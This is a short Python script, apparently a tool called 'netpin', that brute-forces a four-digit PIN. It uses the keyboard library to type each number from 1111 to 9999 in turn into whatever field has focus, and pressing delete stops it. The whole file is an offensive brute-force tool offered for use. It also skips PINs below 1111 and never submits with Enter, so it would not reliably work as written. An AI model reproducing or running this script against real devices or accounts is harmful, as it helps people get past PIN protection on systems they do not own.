import keyboard, time, os

print("[*] Beginning pin cracker in 5 seconds")
time.sleep(5)

for x in range(1111, 10000):
    if keyboard.is_pressed('delete') == 0:
        print("[*] Trying pin: " + str(x))
        keyboard.write(str(x)[0])
        keyboard.write(str(x)[1])
        keyboard.write(str(x)[2])
        keyboard.write(str(x)[3])
        time.sleep(0.001)
    else:
        print("[!] Program stopped by user")
        print("[*] Thanks for using netpin")
        break
